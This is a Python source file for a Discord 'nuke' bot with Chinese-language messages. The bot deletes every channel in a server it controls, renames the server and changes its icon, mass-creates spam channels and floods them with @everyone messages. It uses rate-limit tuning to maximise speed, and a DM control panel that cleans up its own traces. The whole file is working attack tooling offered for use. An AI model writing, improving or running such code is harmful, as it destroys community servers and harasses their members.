import asyncio
import aiohttp
import discord
from discord.ext import commands

import time
import logging
import json
import random
import base64
from collections import deque
from urllib.parse import urlparse
from typing import Optional, List, Tuple, Dict


logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
lgr = logging.getLogger(__name__)

BOT_TOKEN = "token"
DEFAULT_CHANNEL_NAME = "name-nuke-here"
DEFAULT_MESSAGE = (
    "# @everyone "
)
DEFAULT_GUILD_NAME = "by moke nuke"
INV_LNK = "link by dgfsdg nuke ggez"

PROT_GLD = None
PROT_CH = None
LOG_CH = None
INV_CH = None

CD_SEC = 10
MX_NUK = 10

GLOBAL_RPS = 48
MX_CONC_CH = 100
MX_CONC_MSG = 500
MX_FAIL = 10000
CH_CNT = 50
SPM_RND = 30

class GlobalRateLimiter:
    def __init__(self, rps: int = GLOBAL_RPS):
        self._rps = rps
        self._lock = asyncio.Lock()
        self._tokens = float(rps)
        self._last = time.monotonic()

    async def acquire(self):
        while True:
            async with self._lock:
                now = time.monotonic()
                elapsed = now - self._last
                self._tokens = min(self._rps, self._tokens + elapsed * self._rps)
                self._last = now
                if self._tokens >= 1:
                    self._tokens -= 1
                    return
                wait = (1.0 - self._tokens) / self._rps
            await asyncio.sleep(wait)

class BucketManager:
    def __init__(self):
        self._buckets: dict[str, tuple[int, float]] = {}
        self._lock = asyncio.Lock()
        self._route_map: dict[str, str] = {}

    @staticmethod
    def _route_key(method: str, url: str) -> str:
        path = urlparse(url).path
        return f"{method}:{path}"

    async def pre_check(self, method: str, url: str) -> float:
        rk = self._route_key(method, url)
        async with self._lock:
            bid = self._route_map.get(rk)
            if bid and bid in self._buckets:
                remaining, reset_at = self._buckets[bid]
                if remaining <= 0:
                    now = time.monotonic()
                    wait = reset_at - now
                    if wait > 0:
                        return wait
        return 0

    async def update(self, method: str, url: str, headers: dict):
        bid = headers.get("X-RateLimit-Bucket")
        remaining = headers.get("X-RateLimit-Remaining")
        reset_after = headers.get("X-RateLimit-Reset-After")
        if not bid or remaining is None or reset_after is None:
            return
        try:
            rem = int(remaining)
            rst = float(reset_after)
        except (ValueError, TypeError):
            return
        rk = self._route_key(method, url)
        async with self._lock:
            self._route_map[rk] = bid
            reset_at = time.monotonic() + rst
            self._buckets[bid] = (rem, reset_at)

class D123NukeBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.guilds = True
        intents.message_content = True
        super().__init__(
            command_prefix='.',
            intents=intents,
            help_command=None,
            case_insensitive=True
        )
        self.sess: aiohttp.ClientSession = None
        self.tkn: str = ""
        self.fld_req = deque(maxlen=MX_FAIL)
        self.rt_lmt = GlobalRateLimiter(GLOBAL_RPS)
        self.bucket_mgr = BucketManager()
        self._smp_ch  = None
        self._smp_msg = None

        self.pending_icon: Dict[int, tuple] = {}
        self.guild_settings: Dict[int, dict] = {}

        self.bsy = False
        self.bsy_lck = asyncio.Lock()
        self.bsy_queue: asyncio.Queue = asyncio.Queue()
        self.lst_nk = 0.0
        self.srv_nk_cnt: dict[int, int] = {}
        self.blk_srv: set[int] = set()

    async def setup_hook(self):
        connector = aiohttp.TCPConnector(
            limit=2000,
            limit_per_host=1000,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
            force_close=False,
            keepalive_timeout=30
        )
        timeout = aiohttp.ClientTimeout(total=8, connect=3)
        self.sess = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={"Authorization": f"Bot {self.http.token}"}
        )
        self.tkn = self.http.token
        self._smp_ch  = asyncio.Semaphore(MX_CONC_CH)
        self._smp_msg = asyncio.Semaphore(MX_CONC_MSG)
        lgr.info("核心高效化已啟動 ")

    async def close(self):
        if self.sess:
            await self.sess.close()
        await super().close()

    def _record_fail(self):
        self.fld_req.append(time.time())

    def _too_many_fails(self) -> bool:
        now = time.time()
        cnt = sum(1 for t in self.fld_req if now - t <= 600)
        return cnt >= MX_FAIL

    async def _safe_req(self, method: str, url: str, max_retries: int = 3,
                        semaphore: asyncio.Semaphore = None, **kwargs) -> tuple[int, Optional[bytes]]:
        if self._too_many_fails():
            return 0, None
        sem = semaphore or self._smp_ch

        for attempt in range(max_retries):
            pre_wait = await self.bucket_mgr.pre_check(method, url)
            if pre_wait > 0:
                await asyncio.sleep(pre_wait + 0.05)

            await self.rt_lmt.acquire()

            async with sem:
                try:
                    async with self.sess.request(method, url, **kwargs) as resp:
                        status = resp.status
                        body = await resp.read()
                        headers = dict(resp.headers)
                        await self.bucket_mgr.update(method, url, headers)

                        if status == 429:
                            scope = headers.get("X-RateLimit-Scope", "user")
                            try:
                                data = json.loads(body)
                                retry_after = float(data.get("retry_after", 1.0))
                            except:
                                retry_after = float(headers.get("Retry-After", 1.0))

                            if scope != "shared":
                                self._record_fail()

                            if attempt < max_retries - 1:
                                await asyncio.sleep(retry_after + 0.05)
                                continue
                        elif status in (401, 403):
                            self._record_fail()
                        return status, body
                except asyncio.TimeoutError:
                    if attempt == max_retries - 1:
                        return 0, None
                except Exception:
                    self._record_fail()
                    if attempt == max_retries - 1:
                        return 0, None
                    await asyncio.sleep(0.5 * (attempt + 1))
        return 0, None

    async def del_ch(self, ch_id: int) -> bool:
        sts, _ = await self._safe_req("DELETE", f"https://discord.com/api/v10/channels/{ch_id}", semaphore=self._smp_ch)
        return sts in (200, 204)

    async def crt_ch(self, gld_id: int, nm: str) -> Optional[int]:
        url = f"https://discord.com/api/v10/guilds/{gld_id}/channels"
        payload = {"name": nm, "type": 0}
        sts, body = await self._safe_req("POST", url, semaphore=self._smp_ch, json=payload)
        if sts in (200, 201) and body:
            try:
                data = json.loads(body)
                return int(data.get("id"))
            except:
                pass
        return None

    async def chg_gld_nm(self, gld_id: int, nm: str) -> bool:
        url = f"https://discord.com/api/v10/guilds/{gld_id}"
        sts, _ = await self._safe_req("PATCH", url, semaphore=self._smp_ch, json={"name": nm})
        return sts == 200

    async def chg_gld_icn(self, gld_id: int, img_url: str) -> bool:
        try:
            if img_url.startswith('data:'):
                data_uri = img_url
            else:
                async with self.sess.get(img_url) as resp:
                    if resp.status != 200:
                        return False
                    img_data = await resp.read()
                if len(img_data) > 256 * 1024:
                    return False
                if img_url.lower().endswith('.png'):
                    mime = 'image/png'
                elif img_url.lower().endswith(('.jpg', '.jpeg')):
                    mime = 'image/jpeg'
                elif img_url.lower().endswith('.gif'):
                    mime = 'image/gif'
                else:
                    mime = 'image/png'
                b64 = base64.b64encode(img_data).decode()
                data_uri = f"data:{mime};base64,{b64}"
            url = f"https://discord.com/api/v10/guilds/{gld_id}"
            sts, _ = await self._safe_req("PATCH", url, semaphore=self._smp_ch, json={"icon": data_uri})
            return sts == 200
        except Exception:
            return False

    async def ms_del_ch(self, gld_id: int, protect_ch_id: int = None):
        guild = self.get_guild(gld_id)
        if not guild:
            lgr.error(f"找不到伺服器 {gld_id}")
            return
        channels = [ch for ch in guild.text_channels + guild.voice_channels + list(guild.categories)
                    if protect_ch_id is None or ch.id != protect_ch_id]
        if not channels:
            return
        results = await asyncio.gather(*[self.del_ch(ch.id) for ch in channels], return_exceptions=True)
        success = sum(1 for r in results if r is True)
        lgr.info(f"刪除頻道: {success}/{len(channels)}")

    async def ms_crt_ch(self, gld_id: int, count: int, prefix: str) -> List[int]:
        lgr.info(f"開始建立 {count} 個頻道...")
        ch_tasks = [self.crt_ch(gld_id, f"{prefix}-{i+1:03d}") for i in range(count)]
        ch_results = await asyncio.gather(*ch_tasks, return_exceptions=True)
        channel_ids = [r for r in ch_results if isinstance(r, int)]
        lgr.info(f"成功建立 {len(channel_ids)} 個頻道")
        return channel_ids

    async def ms_snd_msg(self, channel_ids: List[int], content: str, rounds: int, use_embed: bool = False) -> int:
        if not channel_ids:
            return 0
        lgr.info(f"啟動訊息發送：{len(channel_ids)} 個頻道，每頻道 {rounds} 輪，總任務 {len(channel_ids)*rounds} 條")

        if use_embed:
            payload = {
                "content": "234",
                "embeds": [{
                    "title": "s234",
                    "url": "234",
                    "description": content,
                    "color": 0x000000,
                    "image": {"url": "https://zynuke.lol/api/8Za453w.gif"},
                    "author": {"name": "234", "url": "234", "icon_url": "https://zynuke.lol/api/8Za453w.gif"},
                    "footer": {"text": "234"},
                    "fields": [
                        {"name": "主123", "234ue": "123", "inline": True},
                        {"name": "234", "234": "h234", "234e": True},
                    ]
                }]
            }
        else:
            payload = {
                "content": content,
            }

        async def worker(ch_id):
            await asyncio.sleep(random.uniform(0, 1.5))
            sent = 0
            for _ in range(rounds):
                if await self._send_bot_msg(ch_id, payload):
                    sent += 1
            return sent

        results = await asyncio.gather(*[worker(cid) for cid in channel_ids], return_exceptions=True)
        total = sum(r for r in results if isinstance(r, int))
        lgr.info(f"訊息發送完成，總計 {total} 條")
        return total

    async def _send_bot_msg(self, ch_id: int, payload: dict) -> bool:
        url = f"https://discord.com/api/v10/channels/{ch_id}/messages"
        sts, _ = await self._safe_req("POST", url, semaphore=self._smp_msg, json=payload)
        return sts == 200

    async def on_ready(self):
        lgr.info(f"✅ 123 - {self.user} (ID: {self.user.id})")
        lgr.info(f"目123: {len(self.guilds)}")
        for g in self.guilds:
            lgr.info(f"   - {g.name} (ID: {g.id})")

    async def on_message(self, message: discord.Message):
        if message.author.bot:
            return

        if isinstance(message.channel, discord.DMChannel) and message.author.id in self.pending_icon:
            gid, dm, fut = self.pending_icon.pop(message.author.id)
            if message.attachments:
                att = message.attachments[0]
                if att.content_type and att.content_type.startswith("image/"):
                    try:
                        img_data = await att.read()
                        if len(img_data) > 256 * 1024:
                            await dm.send("❌ 圖片太大，請小於 256KB")
                            if not fut.done():
                                fut.set_result(True)
                            return
                        mime = "image/png"
                        if img_data[:2] == b'\xff\xd8':
                            mime = "image/jpeg"
                        elif img_data[:6] in (b'GIF89a', b'GIF87a'):
                            mime = "image/gif"
                        b64 = f"data:{mime};base64," + base64.b64encode(img_data).decode()
                        ok = await self.chg_gld_icn(gid, b64)
                        if ok:
                            self.guild_settings[gid] = self.guild_settings.get(gid, {})
                            self.guild_settings[gid]['icon'] = b64
                            await dm.send("✅ 伺服器頭像已更新")
                        else:
                            await dm.send("❌ 更新失敗，請確保機器人有「管理伺服器」權限")
                    except Exception as e:
                        await dm.send(f"❌ 錯誤: {e}")
                else:
                    await dm.send("❌ 請上傳圖片檔 (JPG/PNG/GIF)")
            else:
                await dm.send("❌ 請直接傳送圖片")
            if not fut.done():
                fut.set_result(True)
            return

        if message.content.strip().lower() == ".moke":
            if message.guild is None:
                return
            await self._send_panel(message.author, message.guild)
            return

        if message.guild and message.guild.id == PROT_GLD:
            if message.content.startswith(self.command_prefix):
                try:
                    await message.delete()
                except:
                    pass
            return

        await self.process_commands(message)

    async def _send_panel(self, user: discord.User, guild: discord.Guild):
        try:
            dm = await user.create_dm()
            embed = discord.Embed(
                title=" 123台",
                description="使用下方按鈕設定nuke參數 引擎採用 Bot 直送 \n面板將在 60 秒無操作後自動清除",
                color=discord.Color.dark_red()
            )
            embed.add_field(name=" 功能", value="• 刪除所有頻道\n• 修改名稱/頭像\n• 建立大量頻道（預設 50）\n• Bot 多輪轟炸（預設 30 輪）", inline=False)
            embed.add_field(name=" 預設值", value=f"頻道數: {CH_CNT}\n每頻道輪數: {SPM_RND}", inline=True)
            embed.set_footer(text="D123 NUKE")
            view = D123Panel(self, user, guild.id, dm)
            await dm.send(embed=embed, view=view)
        except:
            pass

    async def cleanup_dm(self, ch: discord.DMChannel):
        try:
            async for m in ch.history(limit=200):
                if m.author == self.user:
                    await m.delete()
                    await asyncio.sleep(0.1)
            lgr.info(f"已清理私聊 {ch.id}")
        except Exception as e:
            lgr.error(f"清理私聊失敗: {e}")

    async def execute_nuke(self, guild_id: int, channel_prefix: str, message_content: str,
                           channel_count: int, rounds: int, use_embed: bool,
                           new_guild_name: str, icon_b64: Optional[str]):
        guild = self.get_guild(guild_id)
        if not guild:
            return "❌ 找不到伺服器"
        try:
            if new_guild_name:
                await self.chg_gld_nm(guild_id, new_guild_name)
            if icon_b64:
                await self.chg_gld_icn(guild_id, icon_b64)
            await self.ms_del_ch(guild_id, protect_ch_id=None)
            channel_ids = await self.ms_crt_ch(guild_id, channel_count, channel_prefix)
            if not channel_ids:
                return "❌ 建立頻道失敗"
            total_sent = await self.ms_snd_msg(channel_ids, message_content, rounds, use_embed)
            return f"✅ 轟炸完成！建立 {len(channel_ids)} 個頻道，發送 {total_sent} 條訊息"
        except Exception as e:
            lgr.exception("執行轟炸時出錯")
            return f"❌ 錯誤: {e}"

    @commands.command(name="zy")
    async def zy(self, ctx: commands.Context, mode: str = ""):
        if not ctx.guild:
            await ctx.send("此指令只能在伺服器內使用")
            return

        if PROT_GLD is not None:
            prot_guild = self.get_guild(PROT_GLD)
            if not prot_guild:
                await ctx.send("無法驗證保護伺服器，請稍後再試")
                return
            member = prot_guild.get_member(ctx.author.id)
            if not member:
                await ctx.send(f"你必須先加入我們的伺服器才能使用此指令\n{INV_LNK}")
                return

        if ctx.guild.id in self.blk_srv:
            await ctx.send("此伺服器已被列入黑名單")
            return

        now = time.time()
        if now - self.lst_nk < CD_SEC:
            await ctx.send(f"冷卻中，請等待 {int(CD_SEC - (now - self.lst_nk))} 秒")
            return

        async with self.bsy_lck:
            if self.bsy:
                await ctx.send("目前忙碌中，請稍後再試")
                return
            self.bsy = True

        try:
            await ctx.send(" 開始執行高效能NUKE")
            use_embed = mode.lower() in ("embed", "e", "emb")
            result = await self.execute_nuke(
                guild_id=ctx.guild.id,
                channel_prefix=DEFAULT_CHANNEL_NAME,
                message_content=DEFAULT_MESSAGE,
                channel_count=CH_CNT,
                rounds=SPM_RND,
                use_embed=use_embed,
                new_guild_name=DEFAULT_GUILD_NAME,
                icon_b64=None
            )
            await ctx.send(result)
            self.srv_nk_cnt[ctx.guild.id] = self.srv_nk_cnt.get(ctx.guild.id, 0) + 1
            if self.srv_nk_cnt[ctx.guild.id] >= MX_NUK:
                self.blk_srv.add(ctx.guild.id)
        finally:
            self.lst_nk = time.time()
            async with self.bsy_lck:
                self.bsy = False
                while not self.bsy_queue.empty():
                    _, evt = self.bsy_queue.get_nowait()
                    evt.set()

class ChangeGuildNameModal(discord.ui.Modal, title=" 修改伺服器名稱"):
    new_name = discord.ui.TextInput(label="新伺服器名稱", placeholder="輸入新名稱", required=True, max_length=100)
    def __init__(self, bot: D123NukeBot, guild_id: int, dm_channel: discord.DMChannel):
        super().__init__(timeout=60)
        self.bot = bot
        self.guild_id = guild_id
        self.dm = dm_channel
    async def on_submit(self, interaction: discord.Interaction):
        name = self.new_name.value.strip() or DEFAULT_GUILD_NAME
        success = await self.bot.chg_gld_nm(self.guild_id, name)
        if success:
            self.bot.guild_settings[self.guild_id] = self.bot.guild_settings.get(self.guild_id, {})
            self.bot.guild_settings[self.guild_id]['name'] = name
            await interaction.response.send_message(f" 名稱已更改為 `{name}`", ephemeral=True)
        else:
            await interaction.response.send_message(" 修改失敗，請確保機器人有管理伺服器權限", ephemeral=True)

class NukeExecutionModal(discord.ui.Modal, title=" 設定NUKE參數"):
    channel_prefix = discord.ui.TextInput(label="頻道前綴", default=DEFAULT_CHANNEL_NAME, max_length=100)
    message = discord.ui.TextInput(label="訊息內容", default=DEFAULT_MESSAGE, style=discord.TextStyle.paragraph)
    channel_count = discord.ui.TextInput(label="建立頻道數量 (1-100)", default=str(CH_CNT))
    spam_rounds = discord.ui.TextInput(label="每頻道訊息輪數 (1-50)", default=str(SPM_RND))
    use_embed = discord.ui.TextInput(label="使用 Embed (yes/no)", default="no", required=False)

    def __init__(self, bot: D123NukeBot, user: discord.User, guild_id: int, dm_channel: discord.DMChannel):
        super().__init__(timeout=180)
        self.bot = bot
        self.user = user
        self.guild_id = guild_id
        self.dm = dm_channel

    async def on_submit(self, interaction: discord.Interaction):
        if interaction.user.id != self.user.id:
            await interaction.response.send_message("❌ 這不是你的面板", ephemeral=True)
            return
        try:
            cnt = max(1, min(100, int(self.channel_count.value)))
            rnd = max(1, min(50, int(self.spam_rounds.value)))
            embed_flag = self.use_embed.value.strip().lower() in ("yes", "y", "true", "embed", "e")
        except:
            await interaction.response.send_message(" 參數錯誤，請輸入數字", ephemeral=True)
            return

        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            await interaction.response.send_message(" 伺服器不存在", ephemeral=True)
            return

        settings = self.bot.guild_settings.get(self.guild_id, {})
        new_name = settings.get('name', DEFAULT_GUILD_NAME)
        icon_b64 = settings.get('icon', None)

        await interaction.response.send_message(
            f" 開始高效能轟炸 `{guild.name}`\n頻道數: {cnt} | 輪數: {rnd}\n伺服器名稱: {new_name}" + (" | 頭像已設定" if icon_b64 else ""),
            ephemeral=True
        )
        result = await self.bot.execute_nuke(
            guild_id=self.guild_id,
            channel_prefix=self.channel_prefix.value,
            message_content=self.message.value,
            channel_count=cnt,
            rounds=rnd,
            use_embed=embed_flag,
            new_guild_name=new_name,
            icon_b64=icon_b64
        )
        await self.dm.send(result)
        await self.bot.cleanup_dm(self.dm)

class D123Panel(discord.ui.View):
    def __init__(self, bot: D123NukeBot, user: discord.User, guild_id: int, dm_channel: discord.DMChannel):
        super().__init__(timeout=60)
        self.bot = bot
        self.user = user
        self.guild_id = guild_id
        self.dm = dm_channel

    async def on_timeout(self):
        lgr.info(f"面板超時，清理私聊 {self.dm.id}")
        await self.bot.cleanup_dm(self.dm)

    @discord.ui.button(label=" 執行NUKE", style=discord.ButtonStyle.danger, emoji="⚡")
    async def nuke_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user.id:
            await interaction.response.send_message(" 不是你", ephemeral=True)
            return
        await interaction.response.send_modal(NukeExecutionModal(self.bot, self.user, self.guild_id, self.dm))

    @discord.ui.button(label=" 改伺服器名稱", style=discord.ButtonStyle.secondary, emoji="✏️")
    async def rename_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user.id:
            await interaction.response.send_message(" 不是你", ephemeral=True)
            return
        await interaction.response.send_modal(ChangeGuildNameModal(self.bot, self.guild_id, self.dm))

    @discord.ui.button(label=" 改頭像 (傳圖)", style=discord.ButtonStyle.secondary, emoji="📸")
    async def icon_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user.id:
            await interaction.response.send_message("❌ 不是你", ephemeral=True)
            return
        await interaction.response.send_message(" **請在本私聊中直接發送一張圖片** (JPG/PNG/GIF)\n60秒內有效", ephemeral=True)
        fut = asyncio.Future()
        self.bot.pending_icon[self.user.id] = (self.guild_id, self.dm, fut)
        try:
            await asyncio.wait_for(fut, timeout=60)
        except asyncio.TimeoutError:
            if self.user.id in self.bot.pending_icon:
                del self.bot.pending_icon[self.user.id]
                await self.dm.send(" 操作超時，未收到圖片")

if __name__ == "__main__":
    bot = D123NukeBot()
    try:
        bot.run(BOT_TOKEN)
    except KeyboardInterrupt:
        print("已停止")
    except Exception as e:
        print(f"錯誤: {e}")